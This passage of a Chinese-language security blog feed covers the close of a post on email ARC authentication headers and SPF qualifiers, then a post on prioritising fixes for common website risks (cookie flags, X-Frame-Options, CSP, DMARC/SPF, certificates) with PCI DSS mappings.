a=rsa-sha256; cv=pass; d=clochette.example.org; </span><br><span class=\"highlight-line\">    s=clochette; t=12345;b=CU87XzXlNlk5X/yW4l73UvPUcP9ivwYWxyBWc  </span><br><span class=\"highlight-line\">    VrRs7+HPx3K05nJhny2fvymbReAmOA9GTH/y+k9kEc59hAKVg==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=3; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    clochette.example.org; h=message-id:date:from:to:subject; s=  </span><br><span class=\"highlight-line\">    clochette; t=12345;bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZY  </span><br><span class=\"highlight-line\">    LQ=;b=o71vwyLsK+Wm4cOSlirXoRwzEvi0vqIjd/2/GkYFYlSd/GGfKzkAgPqx  </span><br><span class=\"highlight-line\">    fK7ccBMP7Zjb/mpeggswHjEMS8x5NQ==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=3; clochette.example.org; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=fail; </span><br><mark class=\"highlight-line highlight-line-active\">    arc=pass (as.2.gmail.example=pass,  </mark><br><mark class=\"highlight-line highlight-line-active\">    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  </mark><br><mark class=\"highlight-line highlight-line-active\">    ams.1.lists.example.org=fail (message has been altered))  </mark><br><span class=\"highlight-line\">Authentication-Results: clochette.example.org; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=fail; </span><br><span class=\"highlight-line\">    arc=pass (as.2.gmail.example=pass,  </span><br><span class=\"highlight-line\">    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  </span><br><span class=\"highlight-line\">    ams.1.lists.example.org=fail (message has been altered))  </span><br><span class=\"highlight-line\">ARC-Seal: i=2; a=rsa-sha256; cv=pass; d=gmail.example; s=20120806;  </span><br><span class=\"highlight-line\">    t=12345; b=Zpukh/kJL4Q7Kv391FKwTepgS56dgHIcdhhJZjsalhqkFIQ  </span><br><span class=\"highlight-line\">    QAJ4T9BE8jjLXWpRNuh81yqnT1/jHn086RwezGw==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    gmail.example; h=message-id:date:from:to:subject;s=20120806;   </span><br><span class=\"highlight-line\">    t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYLQ=;  </span><br><span class=\"highlight-line\">    b=CVoG44cVZvoSs2mMig2wwqPaJ4OZS5XGMCegWqQs1wvRZJS894tJM0xO1  </span><br><span class=\"highlight-line\">    RJLgCPsBOxdA59WSqI9s9DfyKDfWg==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=2; gmail.example; spf=fail  </span><br><span class=\"highlight-line\">    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@example.org; dmarc=fail; </span><br><mark class=\"highlight-line highlight-line-active\">    arc=pass (as.1.lists.example.org=pass, ams.1.lists.example.org=pass)  </mark><br><span class=\"highlight-line\">ARC-Seal: i=1; a=rsa-sha256; cv=none; d=lists.example.org; s=dk-   </span><br><span class=\"highlight-line\">    lists; t=12345; b=TlCCKzgk3TrAa+G77gYYO8Fxk4q/Ml0biqduZJeOYh6+  </span><br><span class=\"highlight-line\">    0zhwQ8u/lHxLi21pxu347isLSuNtvIagIvAQna9a5A==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    lists.example.org; h=message-id:date:from:to:subject; s=dk-    </span><br><span class=\"highlight-line\">    lists; t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYL  </span><br><span class=\"highlight-line\">    Q=; b=DsoD3n3hiwlrN1ma8IZQFgZx8EDO7Wah3hUjIEsYKuShRKYB4LwGUiKD5Y  </span><br><span class=\"highlight-line\">    yHgcIwGHhSc/4+ewYqHMWDnuFxiQ==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=1; lists.example.org; spf=pass  </span><br><span class=\"highlight-line\">    smtp.mfrom=jqd@d1.example; dkim=pass (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=pass</span></code></pre>\n<h3 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> 小結</h3>\n<p>雖然 ARC 用數位簽章的方式做擔保，看似解決了 Indirect Mail Flow 的問題，但他並不是萬靈丹。畢竟 ARC 只是提供更多資訊讓最終收信端可以看到中間『隱形的部分』，並不能保證每一個經過的 mediator 都是值得信任的。</p>\n<p>再者，對 mail server 而言 ARC 只是參考指標（MAY … consult … ARC），無論結果如何，mail server 都可以只採用本身 DMARC 驗證的結果決定信件去留，並不一定要採納 ARC。</p>\n<p>關於 ARC 的許多細節都還有待討論，未來也許會加入其他規範讓這個機制更加完整，更多資訊可以參考 <a href=\"http://arc-spec.org\">ARC-spec</a> 跟 <a href=\"https://datatracker.ietf.org/doc/html/rfc8617\">RFC8617</a>。</p>\n<hr>\n<h2 id=\"q6\"><a class=\"direct-link\" href=\"#q6\">#</a> Q6: 常常看到 SPF 用 <code>~all</code> 而不是 <code>-all</code>，有什麼差？</h2>\n<p>前面在 SPF 設定篇提過有四種 qualifier，這邊貼過來一遍：</p>\n<ul>\n<li><code>pass(+)</code>：若對到 sender-ip，結果 pass（即白名單）。預設值，可以省略（ <code>+all</code> 同 <code>all</code>）</li>\n<li><code>neutral(?)</code>：None ，等同沒有 policy。</li>\n<li><code>softfail(~)</code>：若對到 sender-ip，結果 fail，仍要標注並接受。</li>\n<li><code>fail(-)</code>：若對到 sender-ip，結果 fail（即黑名單）。</li>\n</ul>\n<p>其中，對 <code>all</code> 機制而言最常出現的是 <code>softfail(~all)</code> 跟 <code>fail(-all)</code>。單以 SPF 來說，這兩個的區別明顯就是指示收信的 mail server『雖然我們都是 fail，但請保留 softfail 的』。不過在有設定跟使用 DMARC 的情況下，最後 MDA 只會根據 DMARC 判定的 policy 來決定採取的行為，因為 <code>softfail</code> 跟 <code>fail</code> 都對 DMARC 給出了 fail 的結果，所以他們其實是等價的。只有在單獨使用 SPF 驗證的時候，<code>softfail</code> 跟 <code>fail</code> 的差別才會造成影響。</p>\n<hr>\n<h2 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h2>\n<ol>\n<li><a href=\"https://en.wikipedia.org/wiki/Email_forwarding\">Email Forwarding — Wikipedia</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7960#section-2\">RFC7960</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc5598#section-5\">RFC5598</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8617\">RFC8617</a></li>\n</ol>\n",
      "date_published": "2021-07-23T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/",
      "title": "資安科普番外篇（二）-如何有效率選擇風險進行修復 feat.風險和法規息息相關？！",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p>繼上一篇的<a href=\"https://tech-blog.cymetrics.io/jo/zerobased-common-risk-exposure/\"><strong>資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！</strong></a>)之後，接著我們要來談談關於網站風險的修復，這部分我想大家的直覺應該都是<strong>無條件高風險先修</strong>，但當以這個思維執行時，<strong>把時間以及金錢成本加入權衡之後，又總是很難給出一個符合老闆期待的高 CP 值作法</strong>，而這其實就是我們今天所要討論的主題，<strong>如何有效率的選擇風險進行修復</strong>以及<strong>風險在法規技術面上的影響。</strong></p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E6%91%98%E8%A6%81\"><a class=\"direct-link\" href=\"#%E6%91%98%E8%A6%81\">#</a> 摘要</h2>\n<p>這些商業網站（ e.g. 擁有會員登入、金流功能）在修復風險以前，若將改善複雜度加入考量，可以很大程度的減少在風險管理上的困難，那麼什麼是改善複雜度呢？</p>\n<p>改善複雜度就是在權衡了<strong>時間以及金錢成本後做出的最適風險修復方案。</strong></p>\n<p>舉例來說 常常會聽到許多朋友反應 CSRF Token 設置不易，沒有這麼多時間可以對這項風險進行設定，這時候我會詢問兩個問題</p>\n<ol>\n<li><strong>產業別是否為金融產業（風險管控特別嚴格的產業）</strong></li>\n<li><strong>網站的 Cookie 是否設置了 SameSite 的屬性</strong></li>\n</ol>\n<p>問這兩個問題的原因為，在不屬於風險管控特別嚴格的產業中，當網站的 Cookie 設置了 SameSite 時，通常是可以將 CSRF Token 的設置順序向後排，待有資源時再執行此風險的修復，原因是 SameSite 的功能便是在網站執行跨站請求時，讓伺服器端無法從 Cookie 中取得 Session Id ，進而阻止 CSRF 風險的發生，當然，若是網站連 SameSite 的屬性都尚未設置的話，那我會強烈建議儘速執行 SameSite 的設置，接著將預計花費在設置 CSRF Token 這項高改善複雜度中風險的人力及時間，挪到其餘序列更高的風險修補上（ e.g 低改善複雜度中風險）</p>\n<p>當然權衡的因素很多，除了改善的難易度以外，評估修復的順序也必須思考風險本身的風險（包括攻擊難易度、弱點普遍度、漏洞影響程度）而在接下來的章節中，我也會把這些因素加入說明。</p>\n<p>此外，因應產業對於法規面的需求，以下說明也會提到常見的風險可能會對應到法規中哪一項規範的技術面項目。</p>\n<h2 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6\">#</a> 常見風險改善複雜度</h2>\n<p>說明了什麼是改善複雜度後，接下來將改善複雜度實際套用到上一篇中的常見風險來和大家說明，除了希望能夠更清楚的說明改善複雜度的概念以外，也希望當各位遇到以下風險時， 能夠以此當做參考來進行最適的風險修復方案。</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-fix/p1.png\" alt=\"\"></p>\n<h2 id=\"%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> №５ X-Frame-Options 未設置或安全等級不足</h2>\n<p>排行第五的 X-Frame-Options 設置，在這個項目裡有大於 50％ 的網站設置的安全等級不足或是沒有進行設置，X-Frame-Options 用途為<strong>針對 Iframe 點擊劫持攻擊</strong>的手法進行防禦，避免網頁被內嵌。</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\">#</a> <strong>改善複雜度等級為：低複雜度中風險</strong></h3>\n<p><strong>X-Frame-Options 未設置或安全等級不足：建議若</strong>要避免此風險，需確保只有可信任來源才能嵌入 。</p>\n<p>此項目的改善複雜度並不高，只要按照修復風險參考資料中的設定，選擇適合網站的值即可，建議可以在 Cookie 的三項基本設置完成後進行風險修補。</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A\">#</a> 常見風險對應法規技術面項目：</h3>\n<p><strong>PCIDSS</strong>：Develop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A\">#</a> 細項說明：</h3>\n<blockquote>\n<p>6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%9C%80%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%9C%80%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%E3%80%82\">#</a> <strong>懶人包：需防範可能導致內嵌或是注入的攻擊。</strong></h3>\n<h3 id=\"%E4%BF%AE%E5%BE%A9%E9%A2%A8%E9%9A%AA%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E9%A2%A8%E9%9A%AA%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\">#</a> <strong>修復風險參考資料：</strong></h3>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options\"><strong>X-Frame-Options 回應標頭 - HTTP | MDN</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> №４Cookie 基本設定未設置或安全等級不足</h2>\n<p>排名第四的 Cookie 基本設定未設置或安全等級不足，在這個項目裡有大於 60％ 的網站設置安全等級不足或是沒有進行設置，而 Cookie 的三項基本設定為，能夠<strong>阻止（ XSS ）跨站腳本攻擊影響擴大</strong>的 HttpOnly 、<strong>強化 Https 機制</strong>的 Secure 以及<strong>預防（ CSRF ）跨站請求偽冒</strong>的 SameSite 。</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-2\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-2\">#</a> 改善複雜度等級為：低複雜度中風險</h3>\n<p><strong>SameSite 未設定</strong>：建議依據網站需求選用 Strict 或 Lax 進行設定</p>\n<p><strong>HttpOnly Flag 未設定</strong>：建議在設置中開啟 HttpOnly</p>\n<p><strong>Secure Flag 未設定</strong>：建議在設置中開啟Secure</p>\n<p>三個項目的改善複雜都不高，如果檢測出未開啟或進行設定的話，建議三項應優先且儘速進行設置。</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-2\">#</a> 常見風險對應法規技術面項目：</h3>\n<p><strong>PCIDSS</strong>：Develop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-2\">#</a> 細項說明：</h3>\n<blockquote>\n<p>6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.</p>\n</blockquote>\n<blockquote>\n<p>6.5.7: Protect all web applications and application interfaces from cross-site scripting (XSS).</p>\n</blockquote>\n<blockquote>\n<p>6.5.9: Do not allow cross-site request forgery (CSRF).</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E4%BB%A5%E5%8F%8A-csrf-%E7%9A%84%E6%94%BB%E6%93%8A%E4%B9%9F%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E4%BB%A5%E5%8F%8A-csrf-%E7%9A%84%E6%94%BB%E6%93%8A%E4%B9%9F%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\">#</a> <strong>懶人包：除了防範可能導致內嵌或是注入的攻擊，針對 XSS 以及 CSRF 的攻擊也需要特別注意。</strong></h3>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\">#</a> 風險修復參考資料：</h3>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly/\"><strong>零基礎資安系列（三）-網站安全三本柱（Secure &amp; SameSite &amp; HttpOnly）</strong></a></p>\n<h2 id=\"%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\">#</a> №３ 郵件系統 DMARC 設定</h2>\n<p>排名第三的郵件系統 DMARC 設定，在這個項目裡有大於 70％ 的網站DMARC 設置不全或無設置，<strong>DMARC 會向收件伺服器指示該如何處理特定郵件</strong>，讓伺服器在收到疑似來自自身機構卻未通過驗證檢查的郵件，或是不符合 DMARC 政策記錄中驗證規定的郵件時，採取合適的處置方式。</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\">#</a> 改善複雜度等級為：低複雜度高風險</h3>\n<p>無SPF 紀錄：建議為網域設定 SPF 紀錄</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\">#</a> 改善複雜度等級為：中複雜度高風險</h3>\n<p><strong>無 DMARC 紀錄</strong>：建議為網域設定 DMARC 紀錄（先設置 SPF 與 DKIM）</p>\n<p>由於 DMARC 必須仰賴 SPF 與 DKIM 機制才能發揮功效，因此建議先檢查是否有 SPF 設置錯誤的問題，而雖然 SPF 的改善複雜度並不高，但許多網站的設置皆為預設，因此建議按照上一篇文章的初步檢視之後，可以將 SPF 的改善列為優先項目。</p>\n<p>此外，雖然 DMARC 的改善複雜度不低，但此項目對於防範社交工程來說效果十分顯著，所以若針對社交工程有疑慮的朋友，不妨在 SPF 設置完成之後，參考風險修復參考資料對 DMARC 進行設置。</p>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-2\">#</a> 風險修復參考資料：</h3>\n<p><strong>SPF：</strong></p>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/\"><strong>關於 email security 的大小事 — 設定篇 SPF</strong><br>\n</a></p>\n<p><strong>DMARC &amp; DKIM：</strong></p>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/\"><strong>關於 email security 的大小事 — 設定篇 DKIM、DMARC</strong></a></p>\n<h2 id=\"%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> №２CSP 未設置或安全等級不足</h2>\n<p>排名第二的CSP 未設置或安全等級不足，在這個項目裡有將近 90% 的網站CSP 未設置或安全等級不足，<strong>網頁內容安全政策</strong>（ Content Security Policy, CSP）主要是為了防範 <strong>XSS（跨站腳本攻擊）</strong>，以告知瀏覽器發出的 Request 位置是否受到信任來阻擋非預期的對外連線，加強網站安全性，在 http header 定義限制載入的跨站 script 像是 img-src、script-src…等這些可以載入外部資源的標籤。</p>\n<h3 id=\"%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\">#</a> <strong>低複雜度中風險</strong></h3>\n<p><strong>CSP未設定或安全等級不足</strong>：建議為避免此風險可於 HTTP Headers 中設置 Content-Security-Policy。</p>\n<p>此項目的改善複雜度不高，建議可以在 Cookie 的三項基本設定以及 X-Frame-Options 完成後對此項目進行設置。</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-3\">#</a> 常見風險對應法規技術面項目：</h3>\n<p><strong>PCIDSS</strong> ：Develop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-3\">#</a> 細項說明：</h3>\n<blockquote>\n<p>6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.</p>\n</blockquote>\n<blockquote>\n<p>6.5.7: Protect all web applications and application interfaces from cross-site scripting (XSS).</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E7%9A%84%E6%94%BB%E6%93%8A%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E7%9A%84%E6%94%BB%E6%93%8A%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\">#</a> <strong>懶人包：除了防範可能導致內嵌或是注入的攻擊，針對 XSS 的攻擊需要特別注意。</strong></h3>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-3\">#</a> <strong>風險修復參考資料：</strong></h3>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\"><strong>Content Security Policy (CSP) - HTTP | MDN</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\">#</a> №１網站憑證完整性不足</h2>\n<p>排名第一的網站憑證完整性不足，在這個項目裡有 90% 的完整性不足例如<strong>憑證撤銷機制未設定完整</strong>或<strong>憑證授權機關資源紀錄檢查</strong>，在沒有這些設定的情況下業者很難防堵任意數位憑證認證機構擅自簽署網域憑證，而憑證完整性不足的業者中還包含了<strong>使用不安全的加密</strong>及<strong>過期憑證</strong>與<strong>過舊的 SSL/TLS 協議</strong>，以上問題增加了業者在憑證層面可能發生資安事件的風險機率。</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA-2\"><a class=\"direct-link\" 